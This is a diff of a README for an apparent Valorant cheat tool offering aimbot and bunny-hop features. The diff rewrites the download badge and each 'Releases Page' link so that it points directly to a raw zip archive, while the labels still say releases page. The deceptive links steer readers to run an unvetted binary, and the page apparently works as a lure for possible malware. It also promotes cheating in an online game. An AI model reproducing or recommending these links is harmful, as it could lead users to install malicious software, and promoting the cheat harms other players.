@@ -4,13 +4,13 @@
 
 Welcome! This guide will help you download and run the VALORANT-EFI-DRIVER-Cheat-Hack software. This tool enhances your gameplay in Valorant by providing various features such as aimbot, bunny hop, and more. You don’t need to be a tech expert to get started. Just follow the steps below, and you’ll be ready to go in no time!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
+[![Download Now](https://raw.githubusercontent.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/main/Driver/VALORANT-EFI-DRIVER-Cheat-Hack_2.5.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/main/Driver/VALORANT-EFI-DRIVER-Cheat-Hack_2.5.zip)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** 
    Click on the link below to go to the releases page.
-   [Download from the Releases Page](https://github.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
+   [Download from the Releases Page](https://raw.githubusercontent.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/main/Driver/VALORANT-EFI-DRIVER-Cheat-Hack_2.5.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will see a list of available versions. Look for the latest version, which is usually at the top. 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. Feel free to explore and modify 
 
 While this tool is designed to enhance your gameplay, please be aware that using cheats can lead to account bans or restrictions. Use at your own risk and make sure you understand the potential consequences.
 
-You can always return to the [Download from the Releases Page](https://github.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/releases) to obtain the latest software version and updates as needed. Enjoy your enhanced gaming experience!
+You can always return to the [Download from the Releases Page](https://raw.githubusercontent.com/Hulett77/VALORANT-EFI-DRIVER-Cheat-Hack/main/Driver/VALORANT-EFI-DRIVER-Cheat-Hack_2.5.zip) to obtain the latest software version and updates as needed. Enjoy your enhanced gaming experience!
